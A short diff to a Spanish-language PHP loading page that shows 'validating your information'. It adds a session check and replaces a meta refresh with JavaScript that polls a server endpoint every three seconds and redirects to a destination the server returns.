@@ -1,14 +1,16 @@
 <?php
 session_start();
-include("backend.php");
+if (!isset($_SESSION['usuario'])) {
+    header("Location: index.php");
+    exit;
+}
 ?>
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta http-equiv="refresh" content="3">
-  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
+  <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Cargando...</title>
+  <title>Validando...</title>
   <style>
     body {
       margin: 0;
@@ -39,7 +41,7 @@ include("backend.php");
 
     .mensaje {
       color: #333;
-      font-size: 6vw; /* Escalable en móviles */
+      font-size: 6vw;
       text-align: center;
       padding: 0 10vw;
     }
@@ -60,5 +62,22 @@ include("backend.php");
 <body>
   <p class="mensaje">Estamos validando tu información</p>
   <div class="loader"></div>
+
+  <script>
+    function verificarRedireccion() {
+      fetch("verificar_redireccion.php")
+        .then(res => res.json())
+        .then(data => {
+          if (data.status === "redirigir") {
+            window.location.href = data.destino;
+          } else {
+            setTimeout(verificarRedireccion, 3000);
+          }
+        })
+        .catch(() => setTimeout(verificarRedireccion, 3000));
+    }
+
+    verificarRedireccion();
+  </script>
 </body>
 </html>
